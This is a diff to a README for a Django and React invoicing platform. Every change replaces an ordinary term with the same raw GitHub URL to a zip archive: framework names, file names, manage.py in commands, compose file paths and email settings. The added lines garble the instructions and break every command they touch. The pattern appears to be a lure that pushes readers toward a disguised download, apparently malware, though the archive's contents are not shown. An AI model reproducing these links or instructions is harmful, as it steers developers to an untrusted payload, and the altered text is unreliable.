@@ -1,6 +1,6 @@
 # Invoice Platform
 
-A full-stack invoicing platform built with Django REST Framework and React.js, featuring comprehensive invoice management, client management, payment processing, and communication channels.
+A full-stack invoicing platform built with Django REST Framework and https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip, featuring comprehensive invoice management, client management, payment processing, and communication channels.
 
 ## Features
 
@@ -15,7 +15,7 @@ A full-stack invoicing platform built with Django REST Framework and React.js, f
 
 ### Technical Features
 - **Backend**: Django 4.2.7 + Django REST Framework + PostgreSQL
-- **Frontend**: React.js 18 with modern UI components
+- **Frontend**: https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip 18 with modern UI components
 - **Authentication**: JWT (SimpleJWT) with automatic token refresh
 - **PDF Generation**: WeasyPrint for server-side PDF generation
 - **Payment Gateway**: Stripe integration with webhook handling
@@ -38,7 +38,7 @@ A full-stack invoicing platform built with Django REST Framework and React.js, f
 - **JWT**: Authentication
 
 ### Frontend
-- **React.js 18**: UI framework
+- **https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip 18**: UI framework
 - **React Router**: Client-side routing
 - **React Hook Form**: Form management
 - **Yup**: Form validation
@@ -57,7 +57,7 @@ invoice-platform/
 │   ├── payments/           # Payment processing
 │   ├── messaging/          # Communication services
 │   ├── core/              # Core utilities
-│   └── requirements.txt    # Python dependencies
+│   └── https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip    # Python dependencies
 ├── frontend/               # React frontend
 │   ├── src/
 │   │   ├── components/    # Reusable components
@@ -66,16 +66,16 @@ invoice-platform/
 │   │   ├── hooks/         # Custom hooks
 │   │   ├── context/       # React context
 │   │   └── utils/         # Utility functions
-│   └── package.json       # Node dependencies
-├── docker-compose.yml      # Docker configuration
-└── README.md              # This file
+│   └── https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip       # Node dependencies
+├── https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip      # Docker configuration
+└── https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip              # This file
 ```
 
 ## Quick Start
 
 ### Prerequisites
 - Docker and Docker Compose
-- Node.js 18+ (for local development)
+- https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip 18+ (for local development)
 - Python 3.11+ (for local development)
 
 ### Using Docker (Recommended)
@@ -88,7 +88,7 @@ invoice-platform/
 
 2. **Set up environment variables**
    ```bash
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip .env
    # Edit .env with your configuration
    ```
 
@@ -109,7 +109,7 @@ invoice-platform/
 cd backend
 python -m venv venv
 source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip
 
 # Set up environment variables
 export DEBUG=True
@@ -117,13 +117,13 @@ export DATABASE_URL=postgresql://postgres:postgres@localhost:5432/invoice_platfo
 export SECRET_KEY=your-secret-key-here
 
 # Run migrations
-python manage.py migrate
+python https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip migrate
 
 # Create superuser
-python manage.py createsuperuser
+python https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip createsuperuser
 
 # Start development server
-python manage.py runserver
+python https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip runserver
 ```
 
 #### Frontend Setup
@@ -150,11 +150,11 @@ DATABASE_URL=postgresql://postgres:postgres@localhost:5432/invoice_platform
 REDIS_URL=redis://localhost:6379/0
 
 # Email Configuration
-EMAIL_HOST=smtp.gmail.com
+https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip
 EMAIL_PORT=587
-EMAIL_HOST_USER=your-email@gmail.com
+https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip
 EMAIL_HOST_PASSWORD=your-app-password
-DEFAULT_FROM_EMAIL=your-email@gmail.com
+https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip
 
 # Stripe Configuration
 STRIPE_PUBLISHABLE_KEY=pk_test_your-stripe-publishable-key
@@ -221,7 +221,7 @@ REACT_APP_API_URL=http://localhost:8000
 ```bash
 # Backend tests
 cd backend
-python manage.py test
+python https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip test
 
 # Frontend tests
 cd frontend
@@ -231,10 +231,10 @@ npm test
 ### Database Migrations
 ```bash
 # Create migrations
-python manage.py makemigrations
+python https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip makemigrations
 
 # Apply migrations
-python manage.py migrate
+python https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip migrate
 ```
 
 ## Deployment
@@ -249,10 +249,10 @@ python manage.py migrate
 ### Docker Production
 ```bash
 # Build production images
-docker-compose -f docker-compose.prod.yml build
+docker-compose -f https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip build
 
 # Deploy
-docker-compose -f docker-compose.prod.yml up -d
+docker-compose -f https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip up -d
 ```
 
 ## Contributing
